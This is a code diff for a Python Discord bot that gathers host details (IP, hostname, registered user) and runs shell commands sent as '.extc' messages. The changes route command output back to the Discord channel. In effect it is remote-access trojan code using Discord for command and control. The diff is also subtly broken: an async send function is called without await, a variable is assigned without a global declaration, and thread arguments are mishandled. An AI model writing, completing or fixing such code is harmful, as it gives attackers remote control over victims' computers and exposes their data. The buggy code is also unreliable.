@@ -10,7 +10,7 @@ import subprocess
 import wmi
 import asyncio
 
-
+bd = None
 config_file_path = 'config.ini'
 config = configparser.ConfigParser()
 config.read(config_file_path)
@@ -28,7 +28,9 @@ channel_ids = {
     "info": "Initial info value",
     "main": "Initial main value"
 }
-
+async def send_message(message, channel_id):
+    channel = client.get_channel(channel_id)
+    await channel.send(message)
 def get_system_info():
     try:
         local_ip_address = socket.gethostbyname(hostname)
@@ -77,10 +79,12 @@ def get_system_info():
         f"**Registered User:** {registered_user}"
     )
     return hostname, info
-def execute_command(command):
+def execute_command(*args):
+    command = ''.join(args)
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
     output = result.stdout
-    return output
+    print(bd)
+    send_message(output, bd)
 @client.event
 async def on_ready():
     print(f"{client.user} has connected to Discord!")
@@ -120,9 +124,9 @@ async def on_message(message):
                 words = message.content.split()
                 result_string = ' '.join([word for word in words if word != ".extc"])
                 print(result_string)
-                extc = threading.Thread(target=execute_command, args=result_string)
-                mate = extc.start()
-                od = client.get_channel(message.channel.id)
-                await od.send(mate)
+                extc = threading.Thread(target=execute_command, args=(result_string))
+                extc.start()
+                bd = message.channel.id
+                print(bd)
 
 client.run(BOT_TOKEN)
